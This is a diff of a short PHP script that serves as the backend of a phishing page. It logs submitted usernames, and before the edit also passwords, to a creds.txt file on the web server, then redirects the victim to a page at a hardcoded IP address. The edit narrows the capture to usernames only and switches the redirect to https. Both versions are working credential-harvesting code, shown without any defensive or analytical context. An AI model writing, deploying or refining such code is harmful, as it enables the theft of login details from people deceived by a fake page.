@@ -1,14 +1,10 @@
 <?php
-if (isset($_POST["usuario"]) && isset($_POST["password"])) {
+if (isset($_POST["usuario"])) {
     $user = $_POST["usuario"];
-    $pass = $_POST["password"];
-    ($file = fopen("/var/www/html/creds.txt", "a+")) or
-        die("Unable to openfile!");
-    $data = $user . "::";
-    fwrite($file, $data);
-    $data = $pass . "\n";
+    ($file = fopen("/var/www/html/creds.txt", "a+")) or die("Unable to openfile!");
+    $data = "Usuari: " . $user . "\n";
     fwrite($file, $data);
     fclose($file);
-    header("Location: http://74.234.200.174/index_2.html");
+    header("Location: https://74.234.200.174/index_2.html");
 }
 ?>
